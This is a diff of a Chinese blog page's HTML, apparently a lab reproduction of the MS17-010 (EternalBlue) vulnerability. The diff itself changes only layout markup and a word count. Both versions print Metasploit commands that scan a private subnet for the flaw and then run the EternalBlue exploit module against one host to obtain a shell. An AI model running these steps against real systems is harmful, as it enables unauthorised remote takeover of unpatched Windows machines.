@@ -91,7 +91,7 @@ Msf
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2.2k
+                    2k
                 </span>
                 
                 
@@ -140,9 +140,9 @@ Msf
 <a id="more"></a>
 <h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p>首先打开msf的控制台，我们搜索17010漏洞相关的利用脚本<br><img src="/2019/10/09/MS17-010漏洞复现/console.png" alt></p>
 <p>这里看见有两个种模块<br>auxiliary(探测)<br>exploits(利用)</p>
-<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#利用这个探测模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">#设置目标，扫描这个网段</span><br><span class="line">set RHOST 192.168.79.2/24</span><br><span class="line"></span><br><span class="line">#设置线程</span><br><span class="line">set THREADS 3</span><br><span class="line"></span><br><span class="line">#运行</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#利用这个探测模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">#设置目标，扫描这个网段</span><br><span class="line">set RHOST 192.168.79.2/24</span><br><span class="line"></span><br><span class="line">#设置线程</span><br><span class="line">set THREADS 3</span><br><span class="line"></span><br><span class="line">#运行</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/10/09/MS17-010漏洞复现/scan.png" alt><br>这里发现了我们的两台windos主机都探测出了漏洞</p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用exploit模块<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.79.128</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用exploit模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.79.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/10/09/MS17-010漏洞复现/shell.png" alt></p>
 <p>这里我们就拿下目标主机的shell了</p>
 
